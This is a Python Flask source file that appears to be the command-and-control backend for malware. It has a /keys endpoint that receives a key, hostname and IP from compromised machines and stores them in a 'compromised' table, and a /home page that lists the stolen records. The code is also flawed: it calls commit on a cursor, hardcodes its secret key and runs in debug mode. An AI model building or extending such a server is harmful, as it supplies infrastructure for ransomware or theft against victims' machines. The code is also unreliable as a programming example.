import sqlite3
from flask import Flask, render_template, request
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired

app = Flask(__name__)
app.config['SECRET_KEY'] = 'Super unknown password'

# forms
class NamerForm(FlaskForm):
	name = StringField("Username", validators=[DataRequired()])
	submit = SubmitField("Submit")


#database connection
DATABASE = 'paradise.db'

connection = sqlite3.connect(DATABASE, check_same_thread=False)
cur = connection.cursor()

@app.route('/test')
def test():
	#rendering templates
	return render_template('another.html')

@app.route('/home')
def home():
	data = cur.execute('select * from compromised')
	return render_template('index.html',data=data)

#Post the keys and id
@app.route('/keys', methods=['POST'])
def post_compromised_data():
	keys = (request.form['key'])
	host = (request.form['hostname'])
	ip = (request.form['ip'])
	data = cur.execute("""insert into compromised (llave,hostname,ip) values (?,?,?)""", (keys,host,ip,))
	cur.commit()
	return "success?"

@app.route('/login', methods=['GET','POST'])
def login():
	name = None
	form = NamerForm()
	if form.validate_on_submit():
		name = form.name.data
		form.name.data = ''
	return render_template('login.html', name=name, form=form)


if __name__ == '__main__':
	app.run(debug = True)